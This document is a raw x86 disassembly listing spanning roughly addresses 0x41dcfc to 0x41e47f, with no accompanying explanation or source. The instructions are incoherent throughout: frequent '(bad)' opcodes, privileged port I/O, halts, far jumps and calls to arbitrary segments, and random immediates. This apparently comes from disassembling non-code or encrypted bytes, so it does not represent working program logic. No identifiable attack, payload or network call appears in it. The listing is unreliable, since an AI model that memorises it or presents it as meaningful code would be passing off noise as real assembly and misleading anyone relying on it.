  41dcfc:	adc    edx,DWORD PTR [ebp-0x787f7ba1]
  41dd02:	sar    DWORD PTR [edi+0x6d99416d],0x3f
  41dd09:	pop    ss
  41dd0a:	std    
  41dd0b:	nop
  41dd0c:	out    0x80,eax
  41dd0e:	sbb    ah,BYTE PTR [ebx-0x1233e871]
  41dd14:	jle    0x41dd6c
  41dd16:	add    eax,0x7de850f2
  41dd1b:	xchg   esi,eax
  41dd1c:	aas    
  41dd1d:	(bad)  
  41dd1e:	retf   
  41dd1f:	sysenter 
  41dd21:	out    0x81,al
  41dd23:	and    esp,ecx
  41dd25:	dec    ecx
  41dd26:	jno    0x41dd85
  41dd28:	hlt    
  41dd29:	pop    DWORD PTR [ebp-0x14cefae7]
  41dd2f:	inc    eax
  41dd30:	lods   eax,DWORD PTR ds:[esi]
  41dd31:	(bad)  
  41dd32:	mov    ds:0x792f24f7,al
  41dd37:	xor    eax,0x97d95e6a
  41dd3c:	enter  0x38a0,0x98
  41dd40:	jge    0x41dcdc
  41dd42:	inc    ebp
  41dd43:	push   edi
  41dd44:	adc    BYTE PTR [ebx-0x70bd4f87],dl
  41dd4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd4b:	lods   eax,DWORD PTR ds:[esi]
  41dd4c:	mov    al,ds:0x3b8b60ed
  41dd51:	sub    edi,esp
  41dd53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd54:	das    
  41dd55:	test   DWORD PTR [eax],edi
  41dd57:	stos   DWORD PTR es:[edi],eax
  41dd58:	fwait
  41dd59:	retf   0x2a23
  41dd5c:	push   edi
  41dd5d:	jae    0x41ddb7
  41dd5f:	adc    esp,0xffffff90
  41dd62:	mov    edi,0xb367a2da
  41dd67:	popf   
  41dd68:	aas    
  41dd69:	pop    ebx
  41dd6a:	mov    ah,BYTE PTR [eax+ecx*8+0xe]
  41dd6e:	rcr    DWORD PTR [ebx+0x4f],cl
  41dd71:	or     ah,BYTE PTR [edx+0x48]
  41dd74:	dec    ebp
  41dd75:	mov    bl,0x1d
  41dd77:	lods   eax,DWORD PTR ds:[esi]
  41dd78:	xchg   ah,ah
  41dd7a:	cmp    cl,BYTE PTR [edx+0x27]
  41dd7d:	xchg   esi,eax
  41dd7e:	jb     0x41ddc0
  41dd80:	cmp    esi,esi
  41dd82:	iret   
  41dd83:	mov    ebx,0xfc759de4
  41dd88:	imul   DWORD PTR [ebx+edi*4-0x7d80574d]
  41dd8f:	xor    DWORD PTR [edi-0x2b],edx
  41dd92:	loopne 0x41dd76
  41dd94:	in     eax,dx
  41dd95:	(bad)  
  41dd96:	jb     0x41ddcf
  41dd98:	mov    ebx,0xa978e8e1
  41dd9d:	aas    
  41dd9e:	int3   
  41dd9f:	mov    ebx,DWORD PTR [esi-0xfd76988]
  41dda5:	(bad)  
  41dda6:	lock cmc 
  41dda8:	jle    0x41dd3f
  41ddaa:	xchg   edi,eax
  41ddab:	xor    al,0xf5
  41ddad:	pop    ds
  41ddae:	test   DWORD PTR [ebx+ebx*8],edi
  41ddb1:	pop    ss
  41ddb2:	retf   0xb255
  41ddb5:	xor    al,dl
  41ddb7:	outs   dx,BYTE PTR ds:[esi]
  41ddb8:	adc    al,BYTE PTR ds:[ecx+0x395b9ec]
  41ddbf:	mov    ds:0xa9df0162,al
  41ddc4:	or     al,0xdb
  41ddc6:	pmuludq mm2,QWORD PTR [eax-0x5d]
  41ddca:	sbb    BYTE PTR [edi],cl
  41ddcc:	pop    eax
  41ddcd:	sar    cl,0x3b
  41ddd0:	jg     0x41dd92
  41ddd2:	ins    BYTE PTR es:[edi],dx
  41ddd3:	jne    0x41dddd
  41ddd5:	push   edi
  41ddd6:	or     al,0x1f
  41ddd8:	call   0xeb0c4605
  41dddd:	mov    ?,WORD PTR [eax-0x6ff164e7]
  41dde3:	and    DWORD PTR ds:0xf75f0176,eax
  41dde9:	jle    0x41de57
  41ddeb:	repnz inc edx
  41dded:	mov    WORD PTR [ecx-0x5e],ss
  41ddf0:	xchg   edx,eax
  41ddf1:	out    0x85,al
  41ddf3:	mov    dh,0xb7
  41ddf5:	sub    ah,0x77
  41ddf8:	mov    ebx,DWORD PTR [eax+0x7505524f]
  41ddfe:	xor    DWORD PTR [esi-0x7b],ebp
  41de01:	aaa    
  41de02:	push   fs
  41de04:	cli    
  41de05:	mov    al,ds:0xe557f53a
  41de0a:	and    BYTE PTR [eax+0x7da05124],ch
  41de10:	lods   al,BYTE PTR ds:[esi]
  41de11:	daa    
  41de12:	(bad)  
  41de13:	or     edx,DWORD PTR [esi-0x6f]
  41de16:	ja     0x41dda9
  41de18:	push   ecx
  41de19:	jge    0x41de67
  41de1b:	or     al,0x7
  41de1d:	xchg   DWORD PTR [ecx+0x2a],ecx
  41de20:	cmp    al,0x9
  41de22:	sub    esi,esi
  41de24:	daa    
  41de25:	push   es
  41de26:	jmp    0xb12a05fd
  41de2b:	pop    edi
  41de2c:	mov    eax,0xe0ccb584
  41de31:	mov    dl,0x53
  41de33:	cmp    cl,BYTE PTR [eax+0x4]
  41de36:	xchg   edx,eax
  41de37:	ror    BYTE PTR [ebp+0x2e],cl
  41de3a:	xor    edx,eax
  41de3c:	addr16 xchg esp,edi
  41de3f:	dec    esi
  41de40:	jno    0x41de4c
  41de42:	xor    BYTE PTR ds:0x12e2ecd4,dl
  41de48:	test   al,0xd
  41de4a:	retf   0xe72e
  41de4d:	stos   DWORD PTR es:[edi],eax
  41de4e:	dec    eax
  41de4f:	mov    cl,0xd5
  41de51:	mov    bh,0x12
  41de53:	sub    dl,BYTE PTR [edi]
  41de55:	dec    edx
  41de56:	cmp    DWORD PTR [ecx-0xa],ecx
  41de59:	bnd jbe 0x41de4d
  41de5c:	mov    al,0xc6
  41de5e:	jno    0x41de84
  41de60:	test   cl,ah
  41de62:	fsub   DWORD PTR [esi+0x3cd6e48e]
  41de68:	cdq    
  41de69:	xor    bh,ah
  41de6b:	mov    esp,DWORD PTR [edi]
  41de6d:	sar    DWORD PTR [ebx+0x1b],cl
  41de70:	mov    edx,0x4af3a84d
  41de75:	js     0x41dee5
  41de77:	sub    al,0x9b
  41de79:	dec    edi
  41de7a:	xchg   esi,eax
  41de7b:	pusha  
  41de7c:	aaa    
  41de7d:	pop    eax
  41de7e:	repz jmp 0x23f9:0xcca28f3d
  41de86:	mov    ecx,0xb857f8b3
  41de8b:	pop    ecx
  41de8c:	in     al,0xcd
  41de8e:	jp     0x41de19
  41de90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de91:	push   ds
  41de92:	fcom   DWORD PTR [ebx]
  41de94:	loopne 0x41deff
  41de96:	jp     0x41de1c
  41de98:	pop    es
  41de99:	cld    
  41de9a:	test   DWORD PTR [edx],ecx
  41de9c:	les    esp,FWORD PTR [eax+0x21]
  41de9f:	add    BYTE PTR [ebp+0x45],bh
  41dea2:	(bad)  
  41dea3:	mov    esi,0x9695c41b
  41dea8:	test   BYTE PTR [ebx+0x7f],al
  41deab:	cdq    
  41deac:	pop    ecx
  41dead:	adc    ah,ah
  41deaf:	xchg   ebp,eax
  41deb0:	mov    al,ds:0xa79c1455
  41deb5:	das    
  41deb6:	mov    ecx,0x82d853d1
  41debb:	lea    esi,[ecx+0x66]
  41debe:	mov    cs,WORD PTR [eax+0x32]
  41dec1:	xchg   ecx,eax
  41dec2:	daa    
  41dec3:	adc    BYTE PTR [ecx],0xa0
  41dec6:	mov    edi,esi
  41dec8:	iret   
  41dec9:	xor    al,0xa3
  41decb:	std    
  41decc:	push   ds
  41decd:	adc    edi,ebp
  41decf:	into   
  41ded0:	scas   al,BYTE PTR es:[edi]
  41ded1:	xchg   esi,eax
  41ded2:	xor    al,0xdb
  41ded4:	call   0x56dc:0x4d8328a9
  41dedb:	push   0xffffffd2
  41dedd:	std    
  41dede:	jge    0x41de6a
  41dee0:	(bad)  
  41dee2:	clc    
  41dee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dee4:	int    0xd1
  41dee6:	fs mov eax,0x2a0ca47d
  41deec:	or     al,0x30
  41deee:	je     0x41dec0
  41def0:	out    dx,eax
  41def1:	daa    
  41def2:	xor    ecx,DWORD PTR [edx-0x238f5708]
  41def8:	daa    
  41def9:	fs es dec esi
  41defc:	adc    eax,DWORD PTR [ecx]
  41defe:	pushf  
  41deff:	loopne 0x41dec7
  41df01:	mov    cl,0xbe
  41df03:	pop    esi
  41df04:	hlt    
  41df05:	gs ret 0x145d
  41df09:	jns    0x41ded1
  41df0b:	mov    eax,ds:0x2e7780c7
  41df10:	cmp    BYTE PTR [ebp-0x2c],bh
  41df13:	cmp    BYTE PTR [edx+0x17582bd6],0x9d
  41df1a:	imul   eax,DWORD PTR [ebx+edx*4+0xd24beac],0x6a3ce176
  41df25:	dec    edi
  41df26:	aad    0xfe
  41df28:	loope  0x41decd
  41df2a:	jecxz  0x41dee7
  41df2c:	or     DWORD PTR [eax+eiz*1+0x5f],esp
  41df30:	outs   dx,DWORD PTR ds:[esi]
  41df31:	or     BYTE PTR [ebp+0x449e3984],bh
  41df37:	push   esp
  41df38:	aam    0xb8
  41df3a:	sbb    eax,0x635561ff
  41df3f:	sbb    esi,esp
  41df41:	mov    al,ss:0xc02e6143
  41df47:	push   ecx
  41df48:	push   esp
  41df49:	retf   
  41df4a:	cmp    ch,al
  41df4c:	jmp    0x3c0f:0x7dcdced0
  41df53:	xchg   esp,esi
  41df55:	out    dx,al
  41df56:	and    eax,0x60ea4fc5
  41df5b:	lahf   
  41df5c:	xor    eax,0x2f8fb97d
  41df61:	fnsave [esi]
  41df63:	jl     0x41df0b
  41df65:	sbb    al,0xa5
  41df67:	xchg   DWORD PTR [esi],ecx
  41df69:	jne    0x41df34
  41df6b:	xor    ah,BYTE PTR [ebx+0x12]
  41df6e:	xor    al,0x13
  41df70:	in     al,0x4e
  41df72:	repnz imul ecx,ebx,0xffffffba
  41df76:	sub    ch,dh
  41df78:	push   eax
  41df79:	fild   QWORD PTR [eax+0x3b]
  41df7c:	xchg   edi,eax
  41df7d:	arpl   WORD PTR fs:[esi],di
  41df80:	ja     0x41df1c
  41df82:	in     al,0x97
  41df84:	pop    ecx
  41df85:	dec    ecx
  41df86:	and    DWORD PTR [esi],0x23
  41df89:	xchg   esp,eax
  41df8a:	popf   
  41df8b:	fist   WORD PTR ds:0x4e76d9c8
  41df91:	dec    edi
  41df92:	pop    ebx
  41df93:	iret   
  41df94:	jae    0x41dfe7
  41df96:	pop    ebx
  41df97:	stc    
  41df98:	adc    BYTE PTR [ebx+edx*4-0x201b37a2],bl
  41df9f:	adc    ebp,DWORD PTR [ebx-0x12]
  41dfa2:	lds    ecx,FWORD PTR [eax]
  41dfa4:	dec    edx
  41dfa5:	out    dx,al
  41dfa6:	in     al,0x94
  41dfa8:	mov    ds:0x685874ad,al
  41dfad:	gs mov ah,0x17
  41dfb0:	xor    BYTE PTR [ebp-0x28],dh
  41dfb3:	push   ebx
  41dfb4:	mov    dh,0xca
  41dfb6:	mov    gs,WORD PTR [ebx+eiz*4]
  41dfb9:	lea    esi,[ebp-0x7c]
  41dfbc:	jp     0x41e017
  41dfbe:	aad    0xae
  41dfc0:	(bad)  
  41dfc1:	ss mov bl,0xcc
  41dfc4:	xchg   DWORD PTR [esi-0x6b03bbc4],esp
  41dfca:	dec    ebp
  41dfcb:	or     ah,BYTE PTR [eax]
  41dfcd:	sbb    eax,0x4466c5b5
  41dfd2:	ds pop ebp
  41dfd4:	and    eax,0x93fc1af4
  41dfd9:	adc    ch,BYTE PTR [esi-0x56c95f20]
  41dfdf:	outs   dx,DWORD PTR ds:[esi]
  41dfe0:	loop   0x41e04d
  41dfe2:	data16 jecxz 0x41e011
  41dfe5:	sub    BYTE PTR [ebx],bh
  41dfe7:	sbb    al,0x4e
  41dfe9:	inc    esp
  41dfea:	je     0x41dfed
  41dfec:	pop    ss
  41dfed:	add    al,0xf2
  41dfef:	add    DWORD PTR [ecx],0xffffffe6
  41dff2:	dec    eax
  41dff3:	jle    0x41dfbd
  41dff5:	push   ebp
  41dff6:	jmp    0xb9e1:0x31f94e7c
  41dffd:	push   ebx
  41dffe:	adc    eax,0xc7007401
  41e003:	add    eax,0xbbee0ab7
  41e008:	(bad)
  41e00c:	or     bh,BYTE PTR [edi]
  41e00e:	and    bh,BYTE PTR [eax+eiz*2]
  41e011:	lds    edi,FWORD PTR [edi+0x1d996a43]
  41e017:	xchg   esp,eax
  41e018:	fimul  WORD PTR [edx+esi*4+0x64554c84]
  41e01f:	xor    al,0x92
  41e021:	sbb    eax,edx
  41e023:	loopne 0x41e050
  41e025:	imul   edx,DWORD PTR [ebp-0x4b414b8a],0xbc9074eb
  41e02f:	loope  0x41e0ac
  41e031:	dec    edi
  41e032:	xchg   edi,eax
  41e033:	std    
  41e034:	aam    0xfe
  41e036:	and    eax,0x2b7b018f
  41e03b:	sbb    eax,0xdb59b607
  41e040:	call   0xe41dd8dd
  41e045:	adc    BYTE PTR [edi-0x75],dl
  41e048:	cmc    
  41e049:	pusha  
  41e04a:	jne    0x41e020
  41e04c:	dec    esi
  41e04d:	loope  0x41e0b5
  41e04f:	arpl   WORD PTR [eax+edx*4+0x53],sp
  41e053:	pop    esi
  41e054:	add    al,0x62
  41e056:	sbb    BYTE PTR [edx-0x3e],bl
  41e059:	mov    edi,0x14f2df4c
  41e05e:	(bad)  
  41e062:	sbb    al,0xef
  41e064:	leave  
  41e065:	ss mov ebp,0xbedd992c
  41e06b:	call   0x3bc4:0x51f29480
  41e072:	pop    ecx
  41e073:	mov    ebp,0x6fbb72d6
  41e078:	fisubr DWORD PTR [eax+0x35]
  41e07b:	add    ebp,DWORD PTR [eax]
  41e07d:	jbe    0x41e0d6
  41e07f:	sub    DWORD PTR [ecx+0x16f90048],edi
  41e085:	iret   
  41e086:	lods   al,BYTE PTR ds:[esi]
  41e087:	and    edx,DWORD PTR [ebp-0x605e3d09]
  41e08d:	inc    dx
  41e08f:	and    dh,BYTE PTR [esi+edi*8-0x2f2a4cbf]
  41e096:	in     al,0x90
  41e098:	mov    cl,0xb4
  41e09a:	add    eax,0x9b3c9ff1
  41e09f:	and    dl,ch
  41e0a1:	movd   DWORD PTR [edi+0x6c],mm0
  41e0a5:	add    al,0xa0
  41e0a7:	repnz xchg ecx,eax
  41e0a9:	lods   al,BYTE PTR ds:[esi]
  41e0aa:	jbe    0x41e04c
  41e0ac:	sahf   
  41e0ad:	sbb    edx,DWORD PTR [ecx+ebx*8-0x1c]
  41e0b1:	pop    ss
  41e0b2:	out    dx,eax
  41e0b3:	mov    ebp,0xede13bf4
  41e0b8:	jmp    0x7d04:0xc9d28eb3
  41e0bf:	cmp    DWORD PTR [edx-0x76],ebp
  41e0c2:	jne    0x41e0ca
  41e0c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0c5:	push   esp
  41e0c6:	hlt    
  41e0c7:	cli    
  41e0c8:	mov    ebx,es
  41e0ca:	fs dec eax
  41e0cc:	shl    DWORD PTR [eax+0x2b],1
  41e0cf:	inc    edi
  41e0d0:	dec    esp
  41e0d1:	xor    al,0xea
  41e0d3:	test   eax,0x8b3b2acc
  41e0d8:	call   0xb50f:0x3cd9b965
  41e0df:	xlat   BYTE PTR ds:[ebx]
  41e0e0:	and    al,0x1b
  41e0e2:	fnstenv [esi]
  41e0e4:	jns    0x41e130
  41e0e6:	daa    
  41e0e7:	mov    ecx,0xa0464b05
  41e0ec:	aam    0x4e
  41e0ee:	push   ebx
  41e0ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0f0:	mov    bl,0x59
  41e0f2:	sub    BYTE PTR [edx-0x59ee58ee],0x58
  41e0f9:	js     0x41e13a
  41e0fb:	dec    ecx
  41e0fc:	xchg   ecx,eax
  41e0fd:	mov    ds:0xd8cf766e,al
  41e102:	outs   dx,BYTE PTR ds:[esi]
  41e103:	std    
  41e104:	repz sti 
  41e106:	sbb    DWORD PTR [eax+esi*1],ebx
  41e109:	imul   edx,edx,0x38
  41e10c:	clc    
  41e10d:	(bad)  
  41e10e:	add    DWORD PTR [ebp+0x3],ebx
  41e111:	mov    edx,0x598ae51e
  41e116:	fild   DWORD PTR [ecx]
  41e118:	sub    eax,0xcd6b8e9d
  41e11d:	adc    eax,0xf992a517
  41e122:	push   esi
  41e123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e124:	data16 ins BYTE PTR es:[edi],dx
  41e126:	inc    ebp
  41e127:	push   edi
  41e128:	dec    esi
  41e129:	adc    eax,DWORD PTR ds:0x9d6ec98
  41e12f:	cdq    
  41e130:	hlt    
  41e131:	or     ah,0x4
  41e134:	popa   
  41e135:	test   BYTE PTR [esi-0x3e],dh
  41e138:	aas    
  41e139:	scas   al,BYTE PTR es:[edi]
  41e13a:	cmc    
  41e13b:	add    eax,0x52bc1505
  41e140:	jo     0x41e180
  41e142:	jge    0xcb6bc333
  41e148:	(bad)  
  41e149:	adc    DWORD PTR ds:0x51f7665c,esi
  41e14f:	fnop   
  41e151:	leave  
  41e152:	push   0xf
  41e154:	repz jp 0x41e11a
  41e157:	aas    
  41e158:	pop    ss
  41e159:	les    eax,FWORD PTR [esi+ebp*2-0xa]
  41e15d:	clc    
  41e15e:	jno    0x41e138
  41e160:	jne    0x41e1b2
  41e162:	pop    edi
  41e163:	cs shl ah,1
  41e166:	adc    al,0xd9
  41e168:	(bad)  
  41e169:	sbb    eax,0x51058c42
  41e16e:	fistp  DWORD PTR [edx-0x6404a6eb]
  41e174:	ss xchg edx,eax
  41e176:	adc    BYTE PTR [ecx],bh
  41e178:	fwait
  41e179:	mov    al,0x38
  41e17b:	test   BYTE PTR [ecx],0x58
  41e17e:	dec    ecx
  41e17f:	fsqrt  
  41e181:	scas   al,BYTE PTR es:[edi]
  41e182:	call   0x6bed06d6
  41e187:	stc    
  41e188:	in     al,dx
  41e189:	mul    BYTE PTR [ebp+0x1cc6ad6e]
  41e18f:	js     0x41e159
  41e191:	ror    BYTE PTR [ebp+0x687d18fb],0xab
  41e198:	fnstenv [ebx]
  41e19a:	retf   
  41e19b:	xchg   ebx,eax
  41e19c:	mov    eax,0x9c9d6076
  41e1a1:	push   ebx
  41e1a2:	xchg   esp,eax
  41e1a3:	sbb    edi,eax
  41e1a5:	mov    BYTE PTR [esi],bh
  41e1a7:	xor    esi,esp
  41e1a9:	mov    ecx,0xe61b962e
  41e1ae:	daa    
  41e1af:	sbb    ah,BYTE PTR [ebx]
  41e1b1:	xlat   BYTE PTR ds:[ebx]
  41e1b2:	and    al,0xba
  41e1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1b5:	mov    dh,0x3d
  41e1b7:	mov    dh,cl
  41e1b9:	xor    edx,eax
  41e1bb:	jb     0x41e172
  41e1bd:	retf   
  41e1be:	and    DWORD PTR [edi],edi
  41e1c0:	sub    cl,BYTE PTR [ebx-0x4b]
  41e1c3:	push   cs
  41e1c4:	pushf  
  41e1c5:	xor    al,0xbf
  41e1c7:	dec    eax
  41e1c8:	xchg   esi,eax
  41e1c9:	mov    dh,0xec
  41e1cb:	test   eax,0x50105ef7
  41e1d0:	pop    ebx
  41e1d1:	and    eax,0xf644e9e3
  41e1d6:	sub    al,0x95
  41e1d8:	adc    ah,al
  41e1da:	pop    es
  41e1db:	call   0x6a73da80
  41e1e0:	rol    edx,1
  41e1e2:	dec    eax
  41e1e3:	mov    edx,ebp
  41e1e5:	and    eax,0x40401e26
  41e1ea:	cmp    eax,0x7d84ce85
  41e1ef:	enter  0x4255,0x9a
  41e1f3:	mov    DWORD PTR [ebx-0x74],esp
  41e1f6:	sub    dl,bh
  41e1f8:	xchg   ch,ah
  41e1fa:	aaa    
  41e1fb:	test   eax,0x882c3cb9
  41e200:	xor    esi,ebx
  41e202:	push   edi
  41e204:	add    ecx,edx
  41e206:	aam    0x1d
  41e208:	mov    al,0x90
  41e20a:	jmp    0xf4d9f569
  41e20f:	aas    
  41e210:	(bad)  
  41e211:	mov    dl,0xe4
  41e213:	add    BYTE PTR [esi],bh
  41e215:	stc    
  41e216:	std    
  41e217:	pop    edx
  41e218:	inc    ecx
  41e219:	mov    ecx,DWORD PTR [edx]
  41e21b:	std    
  41e21c:	push   esp
  41e21d:	es mov edx,0xc38d5db6
  41e223:	inc    eax
  41e224:	test   DWORD PTR [eax],eax
  41e226:	hlt    
  41e227:	jbe    0x41e1e2
  41e229:	pop    es
  41e22a:	inc    ebx
  41e22b:	ins    BYTE PTR es:[edi],dx
  41e22c:	and    BYTE PTR [esi],bl
  41e22e:	fs int 0x33
  41e231:	(bad)  
  41e232:	sti    
  41e233:	mov    ah,BYTE PTR [edi-0x6ba769e7]
  41e239:	daa    
  41e23a:	mov    bh,0x8c
  41e23c:	pop    esi
  41e23d:	inc    al
  41e23f:	(bad)  
  41e241:	cmp    al,0x1e
  41e243:	aad    0xe1
  41e245:	push   edx
  41e246:	jl     0x41e1f3
  41e248:	pushf  
  41e249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e24a:	aas    
  41e24b:	aam    0xb7
  41e24d:	push   ds
  41e24e:	or     ecx,DWORD PTR [edx-0x2ea8f6dd]
  41e254:	pop    ecx
  41e255:	leave  
  41e256:	ja     0x41e26c
  41e258:	mov    bh,0x82
  41e25a:	dec    ebp
  41e25b:	sub    DWORD PTR [ecx-0x38],eax
  41e25e:	int    0x9a
  41e260:	add    eax,0x685600fb
  41e265:	and    BYTE PTR [eax+0x435da697],bl
  41e26b:	mov    esi,0xdf7b03f2
  41e270:	(bad)  
  41e271:	fild   QWORD PTR [edx]
  41e273:	push   ecx
  41e274:	jno    0x41e2a9
  41e276:	cmp    DWORD PTR [ecx+0x45],esp
  41e279:	push   es
  41e27a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e27b:	or     DWORD PTR [ebx+0x51],ebp
  41e27e:	sbb    BYTE PTR [edx+0x5ce90235],ch
  41e284:	push   ebx
  41e285:	mov    ch,0xfe
  41e287:	cmp    DWORD PTR [edx+0x5a],0x4d
  41e28b:	mov    al,ds:0x1b01ca85
  41e290:	in     eax,0x67
  41e292:	sbb    al,0xdf
  41e294:	mov    eax,ds:0x890c4a3e
  41e299:	dec    ebx
  41e29a:	cmp    dh,bh
  41e29c:	into   
  41e29d:	test   BYTE PTR [ebp+0x58b7f33b],0x3b
  41e2a4:	xchg   edx,eax
  41e2a5:	add    DWORD PTR [eax-0x53],eax
  41e2a8:	xor    eax,0xb3c192b
  41e2ad:	imul   edx,DWORD PTR [edx-0x71],0x1e80b1bc
  41e2b4:	push   edx
  41e2b5:	push   ecx
  41e2b6:	xor    BYTE PTR gs:[ecx+ebx*4+0x55],0xf0
  41e2bc:	gs sub ah,dl
  41e2bf:	mov    bh,0x4f
  41e2c1:	gs sbb al,0xea
  41e2c4:	or     al,0x24
  41e2c6:	das    
  41e2c7:	mov    ch,0xd4
  41e2c9:	and    BYTE PTR [eax+0x1fd36177],dh
  41e2cf:	pop    ebp
  41e2d0:	adc    BYTE PTR [edi],ah
  41e2d2:	bound  eax,QWORD PTR [ebx-0x3928304b]
  41e2d8:	xchg   ecx,eax
  41e2d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2da:	rcl    DWORD PTR [eax+0x1a],cl
  41e2dd:	hlt    
  41e2de:	inc    edx
  41e2df:	adc    eax,0xf53db87a
  41e2e4:	call   0x1d06:0x42152aa0
  41e2eb:	sti    
  41e2ec:	mov    al,0xc6
  41e2ee:	pusha  
  41e2ef:	mov    eax,ds:0xa85e0fff
  41e2f4:	jne    0x41e291
  41e2f6:	dec    eax
  41e2f7:	mov    dh,0x69
  41e2f9:	or     BYTE PTR [esi-0x5c],dl
  41e2fc:	daa    
  41e2fd:	sub    bl,BYTE PTR [ecx+0x13]
  41e300:	push   0xccdf3831
  41e305:	sbb    BYTE PTR ds:0xceecfb05,0xdd
  41e30c:	pop    ss
  41e30d:	jbe    0x41e324
  41e30f:	jl     0x41e389
  41e311:	inc    ebx
  41e312:	adc    BYTE PTR [ecx-0x70],bl
  41e315:	stos   DWORD PTR es:[edi],eax
  41e316:	(bad)  
  41e317:	fsubr  QWORD PTR [esi-0x10185df]
  41e31d:	out    0xf0,al
  41e31f:	scas   eax,DWORD PTR es:[edi]
  41e320:	shl    BYTE PTR [edx-0x53],cl
  41e323:	dec    esi
  41e324:	jge    0x41e2ef
  41e326:	mov    al,0x48
  41e328:	xchg   ebx,eax
  41e329:	dec    esi
  41e32a:	je     0x41e363
  41e32c:	adc    ebx,0xffffffcc
  41e32f:	pop    edx
  41e330:	jecxz  0x41e322
  41e332:	adc    ecx,DWORD PTR ds:0x796599f1
  41e338:	xchg   esi,eax
  41e339:	aad    0x78
  41e33b:	mov    DWORD PTR [ecx+0x9],edx
  41e33e:	aaa    
  41e33f:	nop
  41e340:	addr16 adc eax,0x6980806f
  41e346:	dec    ebx
  41e347:	sar    DWORD PTR [esi],0xf0
  41e34a:	(bad)  
  41e34b:	out    dx,al
  41e34c:	icebp  
  41e34d:	mov    dh,0x19
  41e34f:	clc    
  41e350:	push   ebx
  41e351:	sbb    bh,bh
  41e353:	and    al,0x6
  41e355:	jmp    0x326:0x36605024
  41e35c:	aad    0x3c
  41e35e:	in     al,dx
  41e35f:	inc    edx
  41e360:	jecxz  0x41e382
  41e362:	mov    esi,0x70c5d4f0
  41e367:	sahf   
  41e368:	pop    ebp
  41e369:	dec    ebx
  41e36a:	sbb    DWORD PTR [esp+edi*8-0x64],esp
  41e36e:	xor    ch,BYTE PTR [ebx+0x78]
  41e371:	xor    DWORD PTR [ebx+esi*4-0x5ef98833],esp
  41e378:	mov    ch,0xaf
  41e37a:	adc    eax,DWORD PTR [edi]
  41e37c:	cmp    eax,0xd506c3c9
  41e381:	sbb    BYTE PTR [edx-0x1e3a6dc6],ch
  41e387:	sub    bl,BYTE PTR [edi+0x75e64199]
  41e38d:	add    BYTE PTR [esi],cl
  41e38f:	popa   
  41e390:	ret    0xcb53
  41e393:	sub    eax,0x5df3dc08
  41e398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e399:	lods   al,BYTE PTR ds:[esi]
  41e39a:	jecxz  0x41e3e1
  41e39c:	adc    DWORD PTR [edi+0x72],ebx
  41e39f:	pop    esp
  41e3a0:	ds push eax
  41e3a2:	or     esi,DWORD PTR [esi]
  41e3a4:	out    0x3e,eax
  41e3a6:	daa    
  41e3a7:	mov    ebx,0xa505df26
  41e3ac:	mov    dl,0x62
  41e3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3af:	or     DWORD PTR [ebx+ebx*2+0x4e],ebx
  41e3b3:	xchg   esp,eax
  41e3b4:	mov    WORD PTR [ebp+0x32],?
  41e3b7:	fwait
  41e3b8:	mov    esp,0xafa91544
  41e3bd:	adc    eax,edi
  41e3bf:	fdivr  QWORD PTR [edi]
  41e3c1:	xchg   DWORD PTR [ebp-0x5f],esi
  41e3c4:	add    DWORD PTR [edx],eax
  41e3c6:	push   ecx
  41e3c7:	out    0x14,al
  41e3c9:	jb     0x41e399
  41e3cb:	das    
  41e3cc:	(bad)  
  41e3cd:	and    cl,BYTE PTR [eax+0x456722bf]
  41e3d3:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41e3d5:	sub    al,0x5f
  41e3d7:	imul   ecx,DWORD PTR [eax+eiz*4+0x2ae299ac],0x6fefa5d9
  41e3e2:	jae    0x41e3d1
  41e3e4:	or     DWORD PTR [ebx],esp
  41e3e6:	add    edx,0x50
  41e3e9:	mul    DWORD PTR [ebx+eiz*4]
  41e3ec:	push   ebp
  41e3ed:	adc    esp,edi
  41e3ef:	sbb    cl,0x73
  41e3f2:	dec    edi
  41e3f3:	sbb    eax,edx
  41e3f5:	lds    eax,FWORD PTR [eax-0x44a00cfe]
  41e3fb:	std    
  41e3fc:	mov    DWORD PTR [ebx+edi*1],ebp
  41e3ff:	or     eax,0xe05e61f5
  41e404:	xlat   BYTE PTR ds:[ebx]
  41e405:	ss xor eax,0x75bb159f
  41e40b:	xor    DWORD PTR [edi-0x59],edi
  41e40e:	fldenv [ecx-0x10fbde7b]
  41e414:	sub    DWORD PTR [eax+0x50],eax
  41e417:	shr    ebp,1
  41e419:	jmp    0x3f4f45c0
  41e41e:	js     0x41e447
  41e420:	mov    ds:0x5718a2fa,eax
  41e425:	mov    al,0x89
  41e427:	sahf   
  41e428:	jae    0x41e4a1
  41e42a:	push   ebx
  41e42b:	data16 int 0xc4
  41e42e:	sar    DWORD PTR [ebx],cl
  41e430:	fmulp  st(2),st
  41e432:	nop
  41e433:	pushf  
  41e434:	loope  0x41e446
  41e436:	lock out 0xf5,eax
  41e439:	xchg   ebx,eax
  41e43a:	jmp    0x41e3eb
  41e43c:	mov    al,BYTE PTR [edi+0x4c]
  41e43f:	btr    DWORD PTR [eax+ecx*2],esp
  41e443:	mov    dl,BYTE PTR [esi]
  41e445:	xchg   edi,eax
  41e446:	push   ecx
  41e447:	leave  
  41e448:	dec    edi
  41e449:	out    0x89,eax
  41e44b:	xchg   edi,eax
  41e44c:	add    BYTE PTR [ebx-0x40e19bc0],cl
  41e452:	jmp    0x30dbeb56
  41e457:	mov    dh,0x86
  41e459:	pusha  
  41e45a:	lods   eax,DWORD PTR ds:[esi]
  41e45b:	ds ret 0x4d66
  41e45f:	mov    dh,0x4c
  41e461:	test   eax,0x31abbd71
  41e466:	mov    BYTE PTR [ebx-0x6d55a900],ah
  41e46c:	add    DWORD PTR [ebp+0x6c128613],0xb
  41e473:	xchg   BYTE PTR [edx-0x1adf584a],bh
  41e479:	es call 0x8e9aa83b
  41e47f:	xor    al,0xd3
